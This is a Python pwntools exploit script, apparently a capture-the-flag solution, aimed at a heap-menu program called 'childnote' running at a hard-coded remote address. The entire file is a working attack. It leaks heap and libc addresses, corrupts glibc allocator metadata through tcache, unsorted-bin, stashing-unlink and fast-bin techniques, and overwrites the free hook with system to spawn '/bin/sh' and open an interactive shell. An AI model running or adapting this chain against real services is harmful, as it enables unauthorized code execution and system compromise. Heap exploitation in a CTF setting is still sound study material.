#!/usr/bin/env python3
from pwn import *

def create(size, data):
    r.sendlineafter(' >','1')
    r.sendlineafter('size : ', str(size))
    r.sendafter('Content : ', data)

def show(idx):
    r.sendlineafter(' >','2')
    r.sendlineafter('index : ', str(idx))
    return r.recvuntil('\n========', drop=True)

def edit(idx, data):
    r.sendlineafter(' >','3')
    r.sendlineafter('index : ', str(idx))
    r.sendafter('Content : ', data)

def delete(idx):
    r.sendlineafter(' >', '4')
    r.sendlineafter('index : ', str(idx))

system_offset = 0x55410
pop_rdi = 0x0000000000001753 # pop rdi ; ret
pop_rsp = 0x000000000000174d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rbp = 0x0000000000001194 # pop rbp ; ret

#r = process('./childnote')
r = remote('140.112.31.97', 30204)
#create fake chunk 
create(0x80, b'a'*8) #0
create(0x80, b'b'*8) #1

#fill tcache 0x80 x7
for i in range(2, 9): # 2 - 8
    create(0x80, b'a'*8)
    delete(i)

#leak heap base
heap_base = u64(show(2) + b'\x00\x00') - 0x010
print(hex(heap_base))

#merge two chunks into one large chunk in unsorted bin
delete(1)
delete(0)

#leak libc base
libc_base = u64(show(0) + b'\x00\x00') - 0x1eb000 - 0xbe0
print(hex(libc_base))

#fake edit size
create(0xf0, b'a'*8) #9

#fill tcache 0xf0 x6
for i in range(6):
    edit(9, b'a'*0x78 + p64(0x100) + p64(0xf0) + p64(0x300))
    edit(1, p64(0x0))
    delete(1)

#fake unsorted bin size
edit(9, b'a'*0x78 + p64(0x100) + p64(0x100) + p64(0x300))
edit(1, b'z'*0x58 + p64(0x100) + p64(0xf1) + p64(libc_base + 0x1ebbe0) + p64(libc_base + 0x1ebbe0) + b'z'*0x90 + p64(0x0) + p64(0x207d1) + b'z'*0x30 + p64(0xf0) + p64(0x20))
#push into small bin
create(0x100, b'a'*8) #10

#make trampoline
#stashing unlink
edit(1, b'z'*0x58 + p64(0x100) + p64(0xf1) + p64(libc_base + 0x1ebcc0) + p64(heap_base + 0x3b0) + p64(0x0) + p64(0xf1) + p64(heap_base + 0x390) + p64(libc_base + 0x1eeb70))
create(0xe0, b'a'*8) #11

#fast bin attack
#fill tcache 0x100 x7
#push chunk into fast bin
for i in range(8):
    edit(9, b'a'*0x78 + p64(0x100) + p64(0x100) + p64(0x300))
    edit(1, b'z'*0xe8 + p64(0x100) + p64(0x31))
    delete(1)

#fake chunk
#fast bin attack
edit(9, b'a'*0x78 + p64(0x100) + p64(0x100) + p64(libc_base + 0x1ed97f))
create(0xf0, b'a'*0x8) #12
create(0xf0, b'g'*0x8) #13

#second time fast bin attack
edit(9, b'a'*0x78 + p64(0x100) + p64(0x100) + p64(0x300))
edit(1, b'z'*0xe8 + p64(0x100) + p64(0x31))
delete(1)
#create overlap chunk
edit(9, b'a'*0x78 + p64(0x100) + p64(0x100) + p64(libc_base + 0x1eda5f))
create(0xf0, b'a'*0x8) #14
edit(13, b'z'*0x8 + b'z'*0xc0 + p64(0) + p64(0x100))
create(0xf0, b'a'*0x8) #15

#modify edit size
edit(13, b'z'*0x8 + b'z'*0xc0 + p64(0) + p64(0x100) + p64(0x10000))

#set b'/bin/sh\x00'
edit(9, b'a'*0x78 + p64(0x100) + p64(0x100) + b'/bin/sh\x00')

#launch free hook
for i in range(150):
    edit(15, b'z'*0x8 + b'z'*0x10a9 + p64(libc_base + system_offset))
delete(1)

r.interactive()

